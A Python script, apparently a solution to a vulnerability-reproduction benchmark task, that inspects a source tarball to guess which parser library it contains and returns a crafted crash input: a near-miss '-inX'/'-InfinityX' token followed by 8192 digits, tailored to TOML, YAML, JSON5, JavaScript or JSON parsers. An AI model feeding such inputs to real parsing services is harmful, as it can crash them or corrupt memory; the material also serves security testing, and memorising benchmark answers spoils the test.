import os
import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        project = None
        filenames = []
        try:
            with tarfile.open(src_path) as tf:
                for m in tf.getmembers():
                    name = m.name.lower()
                    filenames.append(name)
        except Exception:
            pass

        def has_any(subs):
            for s in subs:
                for f in filenames:
                    if s in f:
                        return True
            return False

        # Detect project heuristically
        if has_any(['toml++', 'toml11', 'toml.hpp', 'toml.h', 'toml.c', 'toml/']):
            project = 'toml'
        elif has_any(['yaml-cpp', 'yaml.h', 'libyaml', 'yaml/']):
            project = 'yaml'
        elif has_any(['json5', 'hjson']):
            project = 'json5'
        elif has_any(['quickjs', 'duktape', 'mujs']):
            project = 'js'
        elif has_any(['cjson', 'yyjson', 'rapidjson', 'json-c', 'parson', 'jansson']):
            project = 'json'
        else:
            # Try to glean from CMakeLists or meson
            if has_any(['cmakelists.txt']):
                # Peek at likely project names in paths
                if has_any(['toml']):
                    project = 'toml'
                elif has_any(['yaml']):
                    project = 'yaml'
                elif has_any(['json']):
                    project = 'json'
            if project is None:
                # As a general fallback, TOML is a common target for such Infinity parsing bugs
                project = 'toml'

        # Build payloads
        if project == 'toml':
            # Craft a TOML snippet where a value looks like a negative infinity token but isn't,
            # followed by a long numeric sequence to tickle downstream parsing/overflow paths.
            # Example: key = -inX0000...
            payload = []
            payload.append(b'key = -inX')
            payload.append(b'0' * 8192)
            payload.append(b'\n')
            return b''.join(payload)

        if project == 'yaml':
            # YAML recognizes .inf/.Inf and -.inf; we give "-.inX" (not infinity) and a long sequence of digits
            # to stress parsing and trigger the buggy advancement logic.
            payload = []
            payload.append(b'a: -.inX')
            payload.append(b'0' * 8192)
            payload.append(b'\n')
            return b''.join(payload)

        if project == 'json5':
            # JSON5 supports -Infinity; we provide "-InfinityX" (not infinity) followed by digits
            payload = []
            payload.append(b'{ "a": -InfinityX')
            payload.append(b'9' * 8192)
            payload.append(b' }')
            return b''.join(payload)

        if project == 'js':
            # Many JS engines support -Infinity literal; we provide a near-miss and a lot of digits
            payload = []
            payload.append(b'(function(){return -InfinityX')
            payload.append(b'9' * 8192)
            payload.append(b';})();')
            return b''.join(payload)

        if project == 'json':
            # Some JSON parsers with extensions accept Infinity; try a near-miss in a value context
            payload = []
            payload.append(b'{ "a": -InfinityX')
            payload.append(b'0' * 8192)
            payload.append(b'}')
            return b''.join(payload)

        # Last resort: a generic near-infinity token with a leading minus and long numeric tail.
        return b'-inX' + b'0' * 8192
